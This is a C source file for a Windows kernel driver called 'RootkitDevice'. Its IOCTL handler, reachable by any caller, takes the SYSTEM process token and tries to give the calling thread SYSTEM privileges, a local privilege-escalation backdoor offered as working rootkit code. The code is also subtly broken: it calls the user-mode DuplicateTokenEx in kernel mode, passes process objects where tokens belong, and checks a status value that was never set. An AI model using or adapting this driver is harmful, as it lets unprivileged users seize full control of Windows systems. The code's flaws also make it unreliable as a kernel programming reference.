#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#include <securitybaseapi.h>

DRIVER_DISPATCH HandleCustomIOCTL;

#define IOCTL_ROOTKIT CTL_CODE (FILE_DEVICE_UNKNOWN, 0x2049, METHOD_BUFFERED, FILE_ANY_ACCESS)

UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING (L"\\Device\\RootkitDevice");
UNICODE_STRING DEVICE_SYMBOLIC_NAME = RTL_CONSTANT_STRING (L"\\??\\RootkitDeviceLink");



void DriverUnload (PDRIVER_OBJECT dob) {
    DbgPrint ("[RootkitDevice] Driver Unloaded, deleting symbolic links and devices\n");
    IoDeleteDevice (dob->DeviceObject);
    IoDeleteSymbolicLink (&DEVICE_SYMBOLIC_NAME);
}

NTSTATUS
MajorFunctions (PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER (DeviceObject);

    PIO_STACK_LOCATION stackLocation = NULL;
    stackLocation = IoGetCurrentIrpStackLocation (Irp);

    switch (stackLocation->MajorFunction) {
        case IRP_MJ_CREATE:
            DbgPrint ("[RootkitDevice] Handle to symbolic link %wZ opened\n", &DEVICE_SYMBOLIC_NAME);
            Irp->IoStatus.Information = 0;
            Irp->IoStatus.Status = STATUS_SUCCESS;
            break;

        case IRP_MJ_CLOSE:
            DbgPrint ("[RootkitDevice] Handle to symbolic link %wZ closed\n", &DEVICE_SYMBOLIC_NAME);
            Irp->IoStatus.Information = 0;
            Irp->IoStatus.Status = STATUS_SUCCESS;
            break;

        case IRP_MJ_DEVICE_CONTROL:
            CHAR messageFromKernel[] = "Hello from KernelLand";

            if (stackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_ROOTKIT) {
                DbgPrint ("[RootkitDevice] IOCTL_ROOTKIT (0x%x) issued\n", stackLocation->Parameters.DeviceIoControl.IoControlCode);
                DbgPrint ("[RootkitDevice] Input received from UserLand: %s\n", (char*) Irp->AssociatedIrp.SystemBuffer);

                // Get current process token
                PEPROCESS currentProcess = NULL;
                currentProcess = IoGetCurrentProcess ();
                PACCESS_TOKEN currentProcessToken = NULL;
                currentProcessToken = PsReferencePrimaryToken (currentProcess);
                DbgPrint ("[RootkitDevice] Current process token: 0x%x\n", currentProcessToken);

                // Get "nt authority\system" process
                PEPROCESS systemProcess = NULL;
                PsLookupProcessByProcessId ((HANDLE) 4, &systemProcess);

                // Get "nt authority\system" token
                PACCESS_TOKEN systemProcessToken = NULL;
                systemProcessToken = PsReferencePrimaryToken (systemProcess);
                DbgPrint ("[RootkitDevice] System process token: 0x%x\n", systemProcessToken);

                //Duplicate "nt authority\system" token
                DuplicateTokenEx (systemProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &currentProcessToken);

                // Set the new token to the current process
                PsDereferencePrimaryToken (currentProcess);
                PsDereferencePrimaryToken (systemProcess);
                PsImpersonateClient (PsGetCurrentThread (), currentProcessToken, FALSE, FALSE, SecurityImpersonation);

                DbgPrint ("[RootkitDevice] Current process token replaced with system process token\n");
                DbgPrint ("[RootkitDevice] Current process token: 0x%x\n", PsReferencePrimaryToken (currentProcess));

                Irp->IoStatus.Information = strlen (messageFromKernel);
                Irp->IoStatus.Status = STATUS_SUCCESS;

                DbgPrint ("[RootkitDevice] Sending to UserLand: %s\n", messageFromKernel);
                DbgPrint ("[RootkitDevice] SIZE %d\n", strlen (messageFromKernel) + 1);
                RtlCopyMemory (Irp->AssociatedIrp.SystemBuffer, messageFromKernel, strlen (messageFromKernel) + 1);
            }
            break;
        default:
            break;
    }

    IoCompleteRequest (Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS
DriverEntry (PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER (DriverObject);
    UNREFERENCED_PARAMETER (RegistryPath);

    NTSTATUS status = 0;

    // routine that will execute when the driver is unloaded/service is stopped
    DriverObject->DriverUnload = DriverUnload;

    // routine for handling IO requests from user land
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MajorFunctions;

    // routine that will execute once a handle to the device's symbolic link is opened/closed
    DriverObject->MajorFunction[IRP_MJ_CREATE] = MajorFunctions;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = MajorFunctions;

    DbgPrint ("[RootkitDevice] Driver Loaded\n");

    IoCreateDevice (DriverObject, 0, &DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);
    if (!NT_SUCCESS (status)) {
        DbgPrint ("[RootkitDevice] Could not create device %wZ\n", DEVICE_NAME);
    } else {
        DbgPrint ("[RootkitDevice] Device %wZ created\n", DEVICE_NAME);
    }

    status = IoCreateSymbolicLink (&DEVICE_SYMBOLIC_NAME, &DEVICE_NAME);
    if (!NT_SUCCESS (status)) {
        DbgPrint ("[RootkitDevice] Could not create symbolic link %wZ\n", DEVICE_SYMBOLIC_NAME);
    } else {
        DbgPrint ("[RootkitDevice] Symbolic link %wZ created\n", DEVICE_SYMBOLIC_NAME);
    }

    return STATUS_SUCCESS;
}